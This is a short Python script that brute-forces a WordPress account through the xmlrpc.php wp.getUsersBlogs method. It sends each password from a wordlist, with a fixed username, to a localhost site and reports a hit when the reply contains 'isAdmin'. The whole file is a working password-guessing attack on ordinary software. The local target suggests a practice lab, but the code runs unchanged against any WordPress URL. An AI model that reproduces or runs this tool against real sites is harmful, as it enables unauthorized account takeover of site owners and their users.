import requests

username = "qwe"

url = "http://localhost:8081/xmlrpc.php"
headers = {
    "User-Agent": "Python-xmlrpc/3.13"
}

with open('passwords.txt') as wordlist:
    for password in wordlist.readlines():
        payload = f"""
<?xml version='1.0'?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param>
<value><string>{username}</string></value>
</param>
<param>
<value><string>{password}</string></value>
</param>
</params>
</methodCall>
"""
        response = requests.post(url=url, data=payload, headers=headers)
        if "isAdmin" in response.text:
            print(f"[+] Found the password: {password}")
            exit()
        else:
            print(f"[-] Trying: {password}")
